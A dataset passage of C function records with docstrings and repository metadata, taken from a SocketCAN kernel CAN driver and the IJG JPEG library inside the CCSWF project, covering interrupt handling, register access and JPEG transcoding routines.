{"docstring": "/* reset controller hardware (with specific non controller hardware) */\n", "func_signal": "int hw_reset_dev(int dev_num)", "code": "{ return 0; }\n\n#define WRITEP\t\t0x01 /* inverted at port  */\n#define DATASTB\t\t0x02 /* inverted at port and at device*/\n#define ADDRSTB\t\t0x08 /* inverted at port and at device*/\n#define PORTREAD\t0x20\n\nstatic DEFINE_SPINLOCK(c200_lock);\n\n/* read from controller register */\nu8 hw_readreg(unsigned long base, int reg)\n{\n\tunsigned long pa = base;\n\tunsigned long pc = pa + 2;\n\tunsigned long flags;\n\tu8 irqstatus = (inb(pc) & 0x10) | 0x04;\n\tu8 val;\n\n\tspin_lock_irqsave(&c200_lock, flags);\n\n\toutb(irqstatus | ADDRSTB, pc);\n\toutb((reg & 0x1F) | 0x80, pa);\n\toutb(irqstatus, pc);\n\toutb(irqstatus | PORTREAD, pc);\n\toutb(irqstatus | DATASTB | PORTREAD, pc);\n\tval = inb(pa);\n\toutb(irqstatus, pc);\n\n\tspin_unlock_irqrestore(&c200_lock, flags);\n\n\treturn val;\n}", "path": "kernel\\2.6\\drivers\\net\\can\\old\\hal\\c200.c", "repo_name": "rhyttr/SocketCAN", "stars": 39, "license": "other", "language": "c", "size": 1927}
{"docstring": "/*\n * SJA1000 interrupt handler\n */\n", "func_signal": "static void can_interrupt(int irq, void *dev_id, struct pt_regs *regs)", "code": "{\n\tstruct net_device *dev = (struct net_device*)dev_id;\n\tstruct can_priv *priv = netdev_priv(dev);\n\tuint8_t isrc, status, ecc, alc;\n\tint n = 0;\n\n\tif (priv->state == STATE_UNINITIALIZED) {\n\t\tprintk(KERN_ERR \"%s: %s: uninitialized controller!\\n\", dev->name, __FUNCTION__);\n\t\tchipset_init(dev, 1); /* this should be possible at this stage */\n\t\treturn;\n\t}\n\n\tif (priv->state == STATE_RESET_MODE) {\n\t\tiiDBG(KERN_ERR \"%s: %s: controller is in reset mode! MOD=0x%02X IER=0x%02X IR=0x%02X SR=0x%02X!\\n\",\n\t\t      dev->name, __FUNCTION__, REG_READ(REG_MOD), REG_READ(REG_IER), REG_READ(REG_IR), REG_READ(REG_SR));\n\t\treturn;\n\t}\n\n\twhile ((isrc = REG_READ(REG_IR)) && (n < 20)) {\n\t\tn++;\n\t\tstatus = REG_READ(REG_SR);\n\n\t\tif (isrc & IRQ_WUI) {\n\t\t\t/* wake-up interrupt */\n\t\t\tpriv->can_stats.wakeup++;\n\t\t}\n\t\tif (isrc & IRQ_TI) {\n\t\t\t/* transmission complete interrupt */\n\t\t\tpriv->stats.tx_packets++;\n\t\t\tnetif_wake_queue(dev);\n\t\t}\n\t\tif (isrc & IRQ_RI) {\n\t\t\t/* receive interrupt */\n\n\t\t\twhile (status & SR_RBS) {\n\t\t\t\tcan_rx(dev);\n\t\t\t\tstatus = REG_READ(REG_SR);\n\t\t\t}\n\t\t\tif (priv->state == STATE_PROBE) { /* valid RX -> switch to trx-mode */\n\t\t\t\tiDBG(KERN_INFO \"%s: RI #%d#\\n\", dev->name, n);\n\t\t\t\tchipset_init_trx(dev); /* no tx queue wakeup */\n\t\t\t\tbreak; /* check again after initializing the controller */\n\t\t\t}\n\t\t}\n\t\tif (isrc & IRQ_DOI) {\n\t\t\t/* data overrun interrupt */\n\t\t\tiiDBG(KERN_INFO \"%s: data overrun isrc=0x%02X status=0x%02X\\n\",\n\t\t\t\t\tdev->name, isrc, status);\n\t\t\tiDBG(KERN_INFO \"%s: DOI #%d#\\n\", dev->name, n);\n\t\t\tpriv->can_stats.data_overrun++;\n\t\t\tREG_WRITE(REG_CMR, CMD_CDO); /* clear bit */\n\t\t}\n\t\tif (isrc & IRQ_EI) {\n\t\t\t/* error warning interrupt */\n\t\t\tiiDBG(KERN_INFO \"%s: error warning isrc=0x%02X status=0x%02X\\n\",\n\t\t\t\t\tdev->name, isrc, status);\n\t\t\tiDBG(KERN_INFO \"%s: EI #%d#\\n\", dev->name, n);\n\t\t\tpriv->can_stats.error_warning++;\n\t\t\tif (status & SR_BS) {\n\t\t\t\tprintk(KERN_INFO \"%s: BUS OFF, restarting device\\n\", dev->name);\n\t\t\t\tcan_restart_on(dev);\n\t\t\t\treturn; /* controller has been restarted, so we leave here */\n\t\t\t} else if (status & SR_ES) {\n\t\t\t\tiDBG(KERN_INFO \"%s: error\\n\", dev->name);\n\t\t\t}\n\t\t}\n\t\tif (isrc & IRQ_BEI) {\n\t\t\t/* bus error interrupt */\n\t\t\tiiDBG(KERN_INFO \"%s: bus error isrc=0x%02X status=0x%02X\\n\",\n\t\t\t\t\tdev->name, isrc, status);\n\t\t\tiDBG(KERN_INFO \"%s: BEI #%d# [%d]\\n\", dev->name, n,\n\t\t\t     priv->can_stats.bus_error - priv->can_stats.bus_error_at_init);\n\t\t\tpriv->can_stats.bus_error++;\n\t\t\tecc = REG_READ(REG_ECC);\n\t\t\tiDBG(KERN_INFO \"%s: ECC = 0x%02X (%s, %s, %s)\\n\",\n\t\t\t     dev->name, ecc,\n\t\t\t     (ecc & ECC_DIR) ? \"RX\" : \"TX\",\n\t\t\t     ecc_types[ecc >> ECC_ERR],\n\t\t\t     ecc_errors[ecc & ECC_SEG]);\n\n\t\t\t/* when the bus errors flood the system, restart the controller */\n\t\t\tif (priv->can_stats.bus_error_at_init + MAX_BUS_ERRORS < priv->can_stats.bus_error) {\n\t\t\t\tiDBG(KERN_INFO \"%s: heavy bus errors, restarting device\\n\", dev->name);\n\t\t\t\tcan_restart_on(dev);\n\t\t\t\treturn; /* controller has been restarted, so we leave here */\n\t\t\t}\n#if 1\n\t\t\t/* don't know, if this is a good idea, but it works fine ... */\n\t\t\tif (REG_READ(REG_RXERR) > 128) {\n\t\t\t\tiDBG(KERN_INFO \"%s: RX_ERR > 128, restarting device\\n\", dev->name);\n\t\t\t\tcan_restart_on(dev);\n\t\t\t\treturn; /* controller has been restarted, so we leave here */\n\t\t\t}\n#endif\n\t\t}\n\t\tif (isrc & IRQ_EPI) {\n\t\t\t/* error passive interrupt */\n\t\t\tiiDBG(KERN_INFO \"%s: error passive isrc=0x%02X status=0x%02X\\n\",\n\t\t\t\t\tdev->name, isrc, status);\n\t\t\tiDBG(KERN_INFO \"%s: EPI #%d#\\n\", dev->name, n);\n\t\t\tpriv->can_stats.error_passive++;\n\t\t\tif (status & SR_ES) {\n\t\t\t\tiDBG(KERN_INFO \"%s: -> ERROR PASSIVE, restarting device\\n\", dev->name);\n\t\t\t\tcan_restart_on(dev);\n\t\t\t\treturn; /* controller has been restarted, so we leave here */\n\t\t\t} else {\n\t\t\t\tiDBG(KERN_INFO \"%s: -> ERROR ACTIVE\\n\", dev->name);\n\t\t\t}\n\t\t}\n\t\tif (isrc & IRQ_ALI) {\n\t\t\t/* arbitration lost interrupt */\n\t\t\tiiDBG(KERN_INFO \"%s: error arbitration lost isrc=0x%02X status=0x%02X\\n\",\n\t\t\t\t\tdev->name, isrc, status);\n\t\t\tiDBG(KERN_INFO \"%s: ALI #%d#\\n\", dev->name, n);\n\t\t\tpriv->can_stats.arbitration_lost++;\n\t\t\talc = REG_READ(REG_ALC);\n\t\t\tiDBG(KERN_INFO \"%s: ALC = 0x%02X\\n\", dev->name, alc);\n\t\t}\n\t}\n\tif (n > 1) {\n\t\tiDBG(KERN_INFO \"%s: handled %d IRQs\\n\", dev->name, n);\n\t}\n\n\treturn;\n}", "path": "kernel\\2.4\\drivers\\net\\can\\sja1000\\sja1000.c", "repo_name": "rhyttr/SocketCAN", "stars": 39, "license": "other", "language": "c", "size": 1927}
{"docstring": "/*\n * Skip data --- used to skip over a potentially large amount of\n * uninteresting data (such as an APPn marker).\n *\n * Writers of suspendable-input applications must note that skip_input_data\n * is not granted the right to give a suspension return.  If the skip extends\n * beyond the data currently in the buffer, the buffer can be marked empty so\n * that the next read will cause a fill_input_buffer call that can suspend.\n * Arranging for additional bytes to be discarded before reloading the input\n * buffer is the application writer's problem.\n */\n", "func_signal": "METHODDEF(void)\nskip_input_data (j_decompress_ptr cinfo, long num_bytes)", "code": "{\n  my_src_ptr src = (my_src_ptr) cinfo->src;\n\n  /* Just a dumb implementation for now.  Could use fseek() except\n   * it doesn't work on pipes.  Not clear that being smart is worth\n   * any trouble anyway --- large skips are infrequent.\n   */\n  if (num_bytes > 0) {\n    while (num_bytes > (long) src->pub.bytes_in_buffer) {\n      num_bytes -= (long) src->pub.bytes_in_buffer;\n      (void) fill_input_buffer(cinfo);\n      /* note we assume that fill_input_buffer will never return FALSE,\n       * so suspension need not be handled.\n       */\n    }\n    src->pub.next_input_byte += (size_t) num_bytes;\n    src->pub.bytes_in_buffer -= (size_t) num_bytes;\n  }\n}", "path": "src\\CCGameSWF\\gameswf\\jpeglib\\jdatasrc.c", "repo_name": "getsetgames/CCSWF", "stars": 32, "license": "None", "language": "c", "size": 1706}
{"docstring": "/*\n * Master selection of compression modules for transcoding.\n * This substitutes for jcinit.c's initialization of the full compressor.\n */\n", "func_signal": "LOCAL(void)\ntransencode_master_selection (j_compress_ptr cinfo,\n\t\t\t      jvirt_barray_ptr * coef_arrays)", "code": "{\n  /* Although we don't actually use input_components for transcoding,\n   * jcmaster.c's initial_setup will complain if input_components is 0.\n   */\n  cinfo->input_components = 1;\n  /* Initialize master control (includes parameter checking/processing) */\n  jinit_c_master_control(cinfo, TRUE /* transcode only */);\n\n  /* Entropy encoding: either Huffman or arithmetic coding. */\n  if (cinfo->arith_code) {\n    ERREXIT(cinfo, JERR_ARITH_NOTIMPL);\n  } else {\n    if (cinfo->progressive_mode) {\n#ifdef C_PROGRESSIVE_SUPPORTED\n      jinit_phuff_encoder(cinfo);\n#else\n      ERREXIT(cinfo, JERR_NOT_COMPILED);\n#endif\n    } else\n      jinit_huff_encoder(cinfo);\n  }\n\n  /* We need a special coefficient buffer controller. */\n  transencode_coef_controller(cinfo, coef_arrays);\n\n  jinit_marker_writer(cinfo);\n\n  /* We can now tell the memory manager to allocate virtual arrays. */\n  (*cinfo->mem->realize_virt_arrays) ((j_common_ptr) cinfo);\n\n  /* Write the datastream header (SOI, JFIF) immediately.\n   * Frame and scan headers are postponed till later.\n   * This lets application insert special markers after the SOI.\n   */\n  (*cinfo->marker->write_file_header) (cinfo);\n}", "path": "src\\CCGameSWF\\gameswf\\jpeglib\\jctrans.c", "repo_name": "getsetgames/CCSWF", "stars": 32, "license": "None", "language": "c", "size": 1706}
{"docstring": "/*\n * Initialize coefficient buffer controller.\n *\n * Each passed coefficient array must be the right size for that\n * coefficient: width_in_blocks wide and height_in_blocks high,\n * with unitheight at least v_samp_factor.\n */\n", "func_signal": "LOCAL(void)\ntransencode_coef_controller (j_compress_ptr cinfo,\n\t\t\t     jvirt_barray_ptr * coef_arrays)", "code": "{\n  my_coef_ptr coef;\n  JBLOCKROW buffer;\n  int i;\n\n  coef = (my_coef_ptr)\n    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,\n\t\t\t\tSIZEOF(my_coef_controller));\n  cinfo->coef = (struct jpeg_c_coef_controller *) coef;\n  coef->pub.start_pass = start_pass_coef;\n  coef->pub.compress_data = compress_output;\n\n  /* Save pointer to virtual arrays */\n  coef->whole_image = coef_arrays;\n\n  /* Allocate and pre-zero space for dummy DCT blocks. */\n  buffer = (JBLOCKROW)\n    (*cinfo->mem->alloc_large) ((j_common_ptr) cinfo, JPOOL_IMAGE,\n\t\t\t\tC_MAX_BLOCKS_IN_MCU * SIZEOF(JBLOCK));\n  jzero_far((void FAR *) buffer, C_MAX_BLOCKS_IN_MCU * SIZEOF(JBLOCK));\n  for (i = 0; i < C_MAX_BLOCKS_IN_MCU; i++) {\n    coef->dummy_buffer[i] = buffer + i;\n  }\n}", "path": "src\\CCGameSWF\\gameswf\\jpeglib\\jctrans.c", "repo_name": "getsetgames/CCSWF", "stars": 32, "license": "None", "language": "c", "size": 1706}
{"docstring": "/*\n * Routines to establish binary I/O mode for stdin and stdout.\n * Non-Unix systems often require some hacking to get out of text mode.\n */\n", "func_signal": "GLOBAL(FILE *)\nread_stdin (void)", "code": "{\n  FILE * input_file = stdin;\n\n#ifdef USE_SETMODE\t\t/* need to hack file mode? */\n  setmode(fileno(stdin), O_BINARY);\n#endif\n#ifdef USE_FDOPEN\t\t/* need to re-open in binary mode? */\n  if ((input_file = fdopen(fileno(stdin), READ_BINARY)) == NULL) {\n    fprintf(stderr, \"Cannot reopen stdin\\n\");\n    exit(EXIT_FAILURE);\n  }\n#endif\n  return input_file;\n}", "path": "src\\CCGameSWF\\gameswf\\jpeglib\\cdjpeg.c", "repo_name": "getsetgames/CCSWF", "stars": 32, "license": "None", "language": "c", "size": 1706}
{"docstring": "/*\n * Install a special processing method for COM or APPn markers.\n */\n", "func_signal": "GLOBAL(void)\njpeg_set_marker_processor (j_decompress_ptr cinfo, int marker_code,\n\t\t\t   jpeg_marker_parser_method routine)", "code": "{\n  my_marker_ptr marker = (my_marker_ptr) cinfo->marker;\n\n  if (marker_code == (int) M_COM)\n    marker->process_COM = routine;\n  else if (marker_code >= (int) M_APP0 && marker_code <= (int) M_APP15)\n    marker->process_APPn[marker_code - (int) M_APP0] = routine;\n  else\n    ERREXIT1(cinfo, JERR_UNKNOWN_MARKER, marker_code);\n}", "path": "src\\CCGameSWF\\gameswf\\jpeglib\\jdmarker.c", "repo_name": "getsetgames/CCSWF", "stars": 32, "license": "None", "language": "c", "size": 1706}
{"docstring": "/*\n * Initialize the compression object with default parameters,\n * then copy from the source object all parameters needed for lossless\n * transcoding.  Parameters that can be varied without loss (such as\n * scan script and Huffman optimization) are left in their default states.\n */\n", "func_signal": "GLOBAL(void)\njpeg_copy_critical_parameters (j_decompress_ptr srcinfo,\n\t\t\t       j_compress_ptr dstinfo)", "code": "{\n  JQUANT_TBL ** qtblptr;\n  jpeg_component_info *incomp, *outcomp;\n  JQUANT_TBL *c_quant, *slot_quant;\n  int tblno, ci, coefi;\n\n  /* Safety check to ensure start_compress not called yet. */\n  if (dstinfo->global_state != CSTATE_START)\n    ERREXIT1(dstinfo, JERR_BAD_STATE, dstinfo->global_state);\n  /* Copy fundamental image dimensions */\n  dstinfo->image_width = srcinfo->image_width;\n  dstinfo->image_height = srcinfo->image_height;\n  dstinfo->input_components = srcinfo->num_components;\n  dstinfo->in_color_space = srcinfo->jpeg_color_space;\n  /* Initialize all parameters to default values */\n  jpeg_set_defaults(dstinfo);\n  /* jpeg_set_defaults may choose wrong colorspace, eg YCbCr if input is RGB.\n   * Fix it to get the right header markers for the image colorspace.\n   */\n  jpeg_set_colorspace(dstinfo, srcinfo->jpeg_color_space);\n  dstinfo->data_precision = srcinfo->data_precision;\n  dstinfo->CCIR601_sampling = srcinfo->CCIR601_sampling;\n  /* Copy the source's quantization tables. */\n  for (tblno = 0; tblno < NUM_QUANT_TBLS; tblno++) {\n    if (srcinfo->quant_tbl_ptrs[tblno] != NULL) {\n      qtblptr = & dstinfo->quant_tbl_ptrs[tblno];\n      if (*qtblptr == NULL)\n\t*qtblptr = jpeg_alloc_quant_table((j_common_ptr) dstinfo);\n      MEMCOPY((*qtblptr)->quantval,\n\t      srcinfo->quant_tbl_ptrs[tblno]->quantval,\n\t      SIZEOF((*qtblptr)->quantval));\n      (*qtblptr)->sent_table = FALSE;\n    }\n  }\n  /* Copy the source's per-component info.\n   * Note we assume jpeg_set_defaults has allocated the dest comp_info array.\n   */\n  dstinfo->num_components = srcinfo->num_components;\n  if (dstinfo->num_components < 1 || dstinfo->num_components > MAX_COMPONENTS)\n    ERREXIT2(dstinfo, JERR_COMPONENT_COUNT, dstinfo->num_components,\n\t     MAX_COMPONENTS);\n  for (ci = 0, incomp = srcinfo->comp_info, outcomp = dstinfo->comp_info;\n       ci < dstinfo->num_components; ci++, incomp++, outcomp++) {\n    outcomp->component_id = incomp->component_id;\n    outcomp->h_samp_factor = incomp->h_samp_factor;\n    outcomp->v_samp_factor = incomp->v_samp_factor;\n    outcomp->quant_tbl_no = incomp->quant_tbl_no;\n    /* Make sure saved quantization table for component matches the qtable\n     * slot.  If not, the input file re-used this qtable slot.\n     * IJG encoder currently cannot duplicate this.\n     */\n    tblno = outcomp->quant_tbl_no;\n    if (tblno < 0 || tblno >= NUM_QUANT_TBLS ||\n\tsrcinfo->quant_tbl_ptrs[tblno] == NULL)\n      ERREXIT1(dstinfo, JERR_NO_QUANT_TABLE, tblno);\n    slot_quant = srcinfo->quant_tbl_ptrs[tblno];\n    c_quant = incomp->quant_table;\n    if (c_quant != NULL) {\n      for (coefi = 0; coefi < DCTSIZE2; coefi++) {\n\tif (c_quant->quantval[coefi] != slot_quant->quantval[coefi])\n\t  ERREXIT1(dstinfo, JERR_MISMATCHED_QUANT_TABLE, tblno);\n      }\n    }\n    /* Note: we do not copy the source's Huffman table assignments;\n     * instead we rely on jpeg_set_colorspace to have made a suitable choice.\n     */\n  }\n  /* Also copy JFIF version and resolution information, if available.\n   * Strictly speaking this isn't \"critical\" info, but it's nearly\n   * always appropriate to copy it if available.  In particular,\n   * if the application chooses to copy JFIF 1.02 extension markers from\n   * the source file, we need to copy the version to make sure we don't\n   * emit a file that has 1.02 extensions but a claimed version of 1.01.\n   * We will *not*, however, copy version info from mislabeled \"2.01\" files.\n   */\n  if (srcinfo->saw_JFIF_marker) {\n    if (srcinfo->JFIF_major_version == 1) {\n      dstinfo->JFIF_major_version = srcinfo->JFIF_major_version;\n      dstinfo->JFIF_minor_version = srcinfo->JFIF_minor_version;\n    }\n    dstinfo->density_unit = srcinfo->density_unit;\n    dstinfo->X_density = srcinfo->X_density;\n    dstinfo->Y_density = srcinfo->Y_density;\n  }\n}", "path": "src\\CCGameSWF\\gameswf\\jpeglib\\jctrans.c", "repo_name": "getsetgames/CCSWF", "stars": 32, "license": "None", "language": "c", "size": 1706}
{"docstring": "/*\n * Prepare for input from a stdio stream.\n * The caller must have already opened the stream, and is responsible\n * for closing it after finishing decompression.\n */\n", "func_signal": "GLOBAL(void)\njpeg_stdio_src (j_decompress_ptr cinfo, FILE * infile)", "code": "{\n  my_src_ptr src;\n\n  /* The source object and input buffer are made permanent so that a series\n   * of JPEG images can be read from the same file by calling jpeg_stdio_src\n   * only before the first one.  (If we discarded the buffer at the end of\n   * one image, we'd likely lose the start of the next one.)\n   * This makes it unsafe to use this manager and a different source\n   * manager serially with the same JPEG object.  Caveat programmer.\n   */\n  if (cinfo->src == NULL) {\t/* first time for this JPEG object? */\n    cinfo->src = (struct jpeg_source_mgr *)\n      (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_PERMANENT,\n\t\t\t\t  SIZEOF(my_source_mgr));\n    src = (my_src_ptr) cinfo->src;\n    src->buffer = (JOCTET *)\n      (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_PERMANENT,\n\t\t\t\t  INPUT_BUF_SIZE * SIZEOF(JOCTET));\n  }\n\n  src = (my_src_ptr) cinfo->src;\n  src->pub.init_source = init_source;\n  src->pub.fill_input_buffer = fill_input_buffer;\n  src->pub.skip_input_data = skip_input_data;\n  src->pub.resync_to_restart = jpeg_resync_to_restart; /* use default method */\n  src->pub.term_source = term_source;\n  src->infile = infile;\n  src->pub.bytes_in_buffer = 0; /* forces fill_input_buffer on first read */\n  src->pub.next_input_byte = NULL; /* until buffer loaded */\n}", "path": "src\\CCGameSWF\\gameswf\\jpeglib\\jdatasrc.c", "repo_name": "getsetgames/CCSWF", "stars": 32, "license": "None", "language": "c", "size": 1706}
{"docstring": "/*\n * Case-insensitive matching of possibly-abbreviated keyword switches.\n * keyword is the constant keyword (must be lower case already),\n * minchars is length of minimum legal abbreviation.\n */\n", "func_signal": "GLOBAL(boolean)\nkeymatch (char * arg, const char * keyword, int minchars)", "code": "{\n  register int ca, ck;\n  register int nmatched = 0;\n\n  while ((ca = *arg++) != '\\0') {\n    if ((ck = *keyword++) == '\\0')\n      return FALSE;\t\t/* arg longer than keyword, no good */\n    if (isupper(ca))\t\t/* force arg to lcase (assume ck is already) */\n      ca = tolower(ca);\n    if (ca != ck)\n      return FALSE;\t\t/* no good */\n    nmatched++;\t\t\t/* count matched characters */\n  }\n  /* reached end of argument; fail if it's too short for unique abbrev */\n  if (nmatched < minchars)\n    return FALSE;\n  return TRUE;\t\t\t/* A-OK */\n}", "path": "src\\CCGameSWF\\gameswf\\jpeglib\\cdjpeg.c", "repo_name": "getsetgames/CCSWF", "stars": 32, "license": "None", "language": "c", "size": 1706}
{"docstring": "/*\n * Initialize for a processing pass.\n */\n", "func_signal": "METHODDEF(void)\nstart_pass_coef (j_compress_ptr cinfo, J_BUF_MODE pass_mode)", "code": "{\n  my_coef_ptr coef = (my_coef_ptr) cinfo->coef;\n\n  if (pass_mode != JBUF_CRANK_DEST)\n    ERREXIT(cinfo, JERR_BAD_BUFFER_MODE);\n\n  coef->iMCU_row_num = 0;\n  start_iMCU_row(cinfo);\n}", "path": "src\\CCGameSWF\\gameswf\\jpeglib\\jctrans.c", "repo_name": "getsetgames/CCSWF", "stars": 32, "license": "None", "language": "c", "size": 1706}
{"docstring": "/*\n * Extract color map from a PPM file.\n */\n", "func_signal": "LOCAL(void)\nread_ppm_map (j_decompress_ptr cinfo, FILE * infile)", "code": "{\n  int c;\n  unsigned int w, h, maxval, row, col;\n  int R, G, B;\n\n  /* Initial 'P' has already been read by read_color_map */\n  c = getc(infile);\t\t/* save format discriminator for a sec */\n\n  /* while we fetch the remaining header info */\n  w = read_pbm_integer(cinfo, infile);\n  h = read_pbm_integer(cinfo, infile);\n  maxval = read_pbm_integer(cinfo, infile);\n\n  if (w <= 0 || h <= 0 || maxval <= 0) /* error check */\n    ERREXIT(cinfo, JERR_BAD_CMAP_FILE);\n\n  /* For now, we don't support rescaling from an unusual maxval. */\n  if (maxval != (unsigned int) MAXJSAMPLE)\n    ERREXIT(cinfo, JERR_BAD_CMAP_FILE);\n\n  switch (c) {\n  case '3':\t\t\t/* it's a text-format PPM file */\n    for (row = 0; row < h; row++) {\n      for (col = 0; col < w; col++) {\n\tR = read_pbm_integer(cinfo, infile);\n\tG = read_pbm_integer(cinfo, infile);\n\tB = read_pbm_integer(cinfo, infile);\n\tadd_map_entry(cinfo, R, G, B);\n      }\n    }\n    break;\n\n  case '6':\t\t\t/* it's a raw-format PPM file */\n    for (row = 0; row < h; row++) {\n      for (col = 0; col < w; col++) {\n\tR = getc(infile);\n\tG = getc(infile);\n\tB = getc(infile);\n\tif (R == EOF || G == EOF || B == EOF)\n\t  ERREXIT(cinfo, JERR_BAD_CMAP_FILE);\n\tadd_map_entry(cinfo, R, G, B);\n      }\n    }\n    break;\n\n  default:\n    ERREXIT(cinfo, JERR_BAD_CMAP_FILE);\n    break;\n  }\n}", "path": "src\\CCGameSWF\\gameswf\\jpeglib\\rdcolmap.c", "repo_name": "getsetgames/CCSWF", "stars": 32, "license": "None", "language": "c", "size": 1706}
{"docstring": "/*\n * Reset marker processing state to begin a fresh datastream.\n */\n", "func_signal": "METHODDEF(void)\nreset_marker_reader (j_decompress_ptr cinfo)", "code": "{\n  my_marker_ptr marker = (my_marker_ptr) cinfo->marker;\n\n  cinfo->comp_info = NULL;\t\t/* until allocated by get_sof */\n  cinfo->input_scan_number = 0;\t\t/* no SOS seen yet */\n  cinfo->unread_marker = 0;\t\t/* no pending marker */\n  marker->pub.saw_SOI = FALSE;\t\t/* set internal state too */\n  marker->pub.saw_SOF = FALSE;\n  marker->pub.discarded_bytes = 0;\n  marker->cur_marker = NULL;\n}", "path": "src\\CCGameSWF\\gameswf\\jpeglib\\jdmarker.c", "repo_name": "getsetgames/CCSWF", "stars": 32, "license": "None", "language": "c", "size": 1706}
{"docstring": "/*\n * Read a restart marker, which is expected to appear next in the datastream;\n * if the marker is not there, take appropriate recovery action.\n * Returns FALSE if suspension is required.\n *\n * This is called by the entropy decoder after it has read an appropriate\n * number of MCUs.  cinfo->unread_marker may be nonzero if the entropy decoder\n * has already read a marker from the data source.  Under normal conditions\n * cinfo->unread_marker will be reset to 0 before returning; if not reset,\n * it holds a marker which the decoder will be unable to read past.\n */\n", "func_signal": "METHODDEF(boolean)\nread_restart_marker (j_decompress_ptr cinfo)", "code": "{\n  /* Obtain a marker unless we already did. */\n  /* Note that next_marker will complain if it skips any data. */\n  if (cinfo->unread_marker == 0) {\n    if (! next_marker(cinfo))\n      return FALSE;\n  }\n\n  if (cinfo->unread_marker ==\n      ((int) M_RST0 + cinfo->marker->next_restart_num)) {\n    /* Normal case --- swallow the marker and let entropy decoder continue */\n    TRACEMS1(cinfo, 3, JTRC_RST, cinfo->marker->next_restart_num);\n    cinfo->unread_marker = 0;\n  } else {\n    /* Uh-oh, the restart markers have been messed up. */\n    /* Let the data source manager determine how to resync. */\n    if (! (*cinfo->src->resync_to_restart) (cinfo,\n\t\t\t\t\t    cinfo->marker->next_restart_num))\n      return FALSE;\n  }\n\n  /* Update next-restart state */\n  cinfo->marker->next_restart_num = (cinfo->marker->next_restart_num + 1) & 7;\n\n  return TRUE;\n}", "path": "src\\CCGameSWF\\gameswf\\jpeglib\\jdmarker.c", "repo_name": "getsetgames/CCSWF", "stars": 32, "license": "None", "language": "c", "size": 1706}
{"docstring": "/*\n * Process some data.\n * We process the equivalent of one fully interleaved MCU row (\"iMCU\" row)\n * per call, ie, v_samp_factor block rows for each component in the scan.\n * The data is obtained from the virtual arrays and fed to the entropy coder.\n * Returns TRUE if the iMCU row is completed, FALSE if suspended.\n *\n * NB: input_buf is ignored; it is likely to be a NULL pointer.\n */\n", "func_signal": "METHODDEF(boolean)\ncompress_output (j_compress_ptr cinfo, JSAMPIMAGE input_buf)", "code": "{\n  my_coef_ptr coef = (my_coef_ptr) cinfo->coef;\n  JDIMENSION MCU_col_num;\t/* index of current MCU within row */\n  JDIMENSION last_MCU_col = cinfo->MCUs_per_row - 1;\n  JDIMENSION last_iMCU_row = cinfo->total_iMCU_rows - 1;\n  int blkn, ci, xindex, yindex, yoffset, blockcnt;\n  JDIMENSION start_col;\n  JBLOCKARRAY buffer[MAX_COMPS_IN_SCAN];\n  JBLOCKROW MCU_buffer[C_MAX_BLOCKS_IN_MCU];\n  JBLOCKROW buffer_ptr;\n  jpeg_component_info *compptr;\n\n  /* Align the virtual buffers for the components used in this scan. */\n  for (ci = 0; ci < cinfo->comps_in_scan; ci++) {\n    compptr = cinfo->cur_comp_info[ci];\n    buffer[ci] = (*cinfo->mem->access_virt_barray)\n      ((j_common_ptr) cinfo, coef->whole_image[compptr->component_index],\n       coef->iMCU_row_num * compptr->v_samp_factor,\n       (JDIMENSION) compptr->v_samp_factor, FALSE);\n  }\n\n  /* Loop to process one whole iMCU row */\n  for (yoffset = coef->MCU_vert_offset; yoffset < coef->MCU_rows_per_iMCU_row;\n       yoffset++) {\n    for (MCU_col_num = coef->mcu_ctr; MCU_col_num < cinfo->MCUs_per_row;\n\t MCU_col_num++) {\n      /* Construct list of pointers to DCT blocks belonging to this MCU */\n      blkn = 0;\t\t\t/* index of current DCT block within MCU */\n      for (ci = 0; ci < cinfo->comps_in_scan; ci++) {\n\tcompptr = cinfo->cur_comp_info[ci];\n\tstart_col = MCU_col_num * compptr->MCU_width;\n\tblockcnt = (MCU_col_num < last_MCU_col) ? compptr->MCU_width\n\t\t\t\t\t\t: compptr->last_col_width;\n\tfor (yindex = 0; yindex < compptr->MCU_height; yindex++) {\n\t  if (coef->iMCU_row_num < last_iMCU_row ||\n\t      yindex+yoffset < compptr->last_row_height) {\n\t    /* Fill in pointers to real blocks in this row */\n\t    buffer_ptr = buffer[ci][yindex+yoffset] + start_col;\n\t    for (xindex = 0; xindex < blockcnt; xindex++)\n\t      MCU_buffer[blkn++] = buffer_ptr++;\n\t  } else {\n\t    /* At bottom of image, need a whole row of dummy blocks */\n\t    xindex = 0;\n\t  }\n\t  /* Fill in any dummy blocks needed in this row.\n\t   * Dummy blocks are filled in the same way as in jccoefct.c:\n\t   * all zeroes in the AC entries, DC entries equal to previous\n\t   * block's DC value.  The init routine has already zeroed the\n\t   * AC entries, so we need only set the DC entries correctly.\n\t   */\n\t  for (; xindex < compptr->MCU_width; xindex++) {\n\t    MCU_buffer[blkn] = coef->dummy_buffer[blkn];\n\t    MCU_buffer[blkn][0][0] = MCU_buffer[blkn-1][0][0];\n\t    blkn++;\n\t  }\n\t}\n      }\n      /* Try to write the MCU. */\n      if (! (*cinfo->entropy->encode_mcu) (cinfo, MCU_buffer)) {\n\t/* Suspension forced; update state counters and exit */\n\tcoef->MCU_vert_offset = yoffset;\n\tcoef->mcu_ctr = MCU_col_num;\n\treturn FALSE;\n      }\n    }\n    /* Completed an MCU row, but perhaps not an iMCU row */\n    coef->mcu_ctr = 0;\n  }\n  /* Completed the iMCU row, advance counters for next one */\n  coef->iMCU_row_num++;\n  start_iMCU_row(cinfo);\n  return TRUE;\n}", "path": "src\\CCGameSWF\\gameswf\\jpeglib\\jctrans.c", "repo_name": "getsetgames/CCSWF", "stars": 32, "license": "None", "language": "c", "size": 1706}
{"docstring": "/*\n * Compression initialization for writing raw-coefficient data.\n * Before calling this, all parameters and a data destination must be set up.\n * Call jpeg_finish_compress() to actually write the data.\n *\n * The number of passed virtual arrays must match cinfo->num_components.\n * Note that the virtual arrays need not be filled or even realized at\n * the time write_coefficients is called; indeed, if the virtual arrays\n * were requested from this compression object's memory manager, they\n * typically will be realized during this routine and filled afterwards.\n */\n", "func_signal": "GLOBAL(void)\njpeg_write_coefficients (j_compress_ptr cinfo, jvirt_barray_ptr * coef_arrays)", "code": "{\n  if (cinfo->global_state != CSTATE_START)\n    ERREXIT1(cinfo, JERR_BAD_STATE, cinfo->global_state);\n  /* Mark all tables to be written */\n  jpeg_suppress_tables(cinfo, FALSE);\n  /* (Re)initialize error mgr and destination modules */\n  